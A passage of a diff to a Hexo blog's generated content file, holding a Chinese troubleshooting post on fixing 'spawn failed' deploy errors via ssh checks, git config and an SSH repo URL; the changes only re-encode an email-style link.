generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
       
     </entry>
     
@@ -635,7 +635,7 @@
       <link href="/Hexo/spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%97%A5%E5%BF%97/"/>
       <url>/Hexo/spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%97%A5%E5%BF%97/</url>
       
-        <content type="html"><![CDATA[<hr><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20220906084642319.png" alt="image-20220906084642319"></p><p>本次错误系网络原因</p><p>首先用检查ssh</p><p> <code>ssh -T git@github.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>如果没有出现ssh不能连接，则非ssh出错</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;</a>:yourname&#x2F;yourname.github.io.git</p>]]></content>
+        <content type="html"><![CDATA[<hr><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20220906084642319.png" alt="image-20220906084642319"></p><p>本次错误系网络原因</p><p>首先用检查ssh</p><p> <code>ssh -T git@github.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>如果没有出现ssh不能连接，则非ssh出错</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:yourname&#x2F;yourname.github.io.git</p>]]></content>
       
       
       <categories>
